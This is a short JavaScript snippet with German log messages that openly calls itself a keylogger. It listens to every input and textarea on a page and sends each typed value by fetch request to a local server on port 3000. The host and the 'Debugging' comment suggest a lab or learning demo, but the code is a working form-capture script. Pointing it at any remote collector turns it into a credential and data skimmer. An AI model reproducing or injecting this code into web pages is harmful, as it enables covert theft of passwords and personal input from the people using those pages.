console.log("Keylogger aktiv!");

document.addEventListener("input", function (event) {
    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
        let key = event.target.value;
        console.log("Eingabe erfasst:", key); // Debugging

        fetch(`http://localhost:3000/${encodeURIComponent(key)}`)
            .catch(err => console.error("Fehler beim Senden der Anfrage:", err));
    }
});
